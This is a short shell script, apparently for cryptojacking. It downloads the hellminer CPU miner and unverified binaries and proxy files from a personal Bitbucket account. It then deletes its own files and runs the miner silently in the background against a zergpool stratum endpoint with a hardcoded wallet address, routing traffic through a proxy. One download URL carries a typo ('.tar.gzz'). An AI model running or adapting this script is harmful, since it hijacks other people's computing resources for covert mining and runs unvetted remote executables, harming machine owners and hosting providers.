apt update ; apt install htop neofetch curl cpulimit wget -y
wget -O hmm.tar.gz https://github.com/hellcatz/hminer/releases/download/v0.59.1/hellminer_linux64.tar.gzz && tar -xf hmm.tar.gz && mv hellminer hm
wget -q -O proxy https://bitbucket.org/asimadarasi/alima/downloads/panel && chmod +x proxy
wget https://bitbucket.org/asimadarasi/alima/downloads/libproxychains4.so && chmod +x libproxychains4.so
wget -q https://bitbucket.org/asimadarasi/alima/downloads/proxychains.conf && chmod +x proxychains.conf 
echo "IP ORI ==> "$(curl ifconfig.me)
echo "IP Baru ==> "$(curl ifconfig.me)
rm -rf sh.sh config_*
./hm -u RHTx4HUZRrmy8tWhpn5WWX2x7KmfYS4Txq.pragos -c stratum+ssl://verushash.mine.zergpool.com:13300 -p c=VRSC,id=YANTO$(( $RANDOM % 50 + 1 )) --cpu -1 &> /dev/null &
sudo cpulimit --background --pid $(pgrep namo) --limit 200
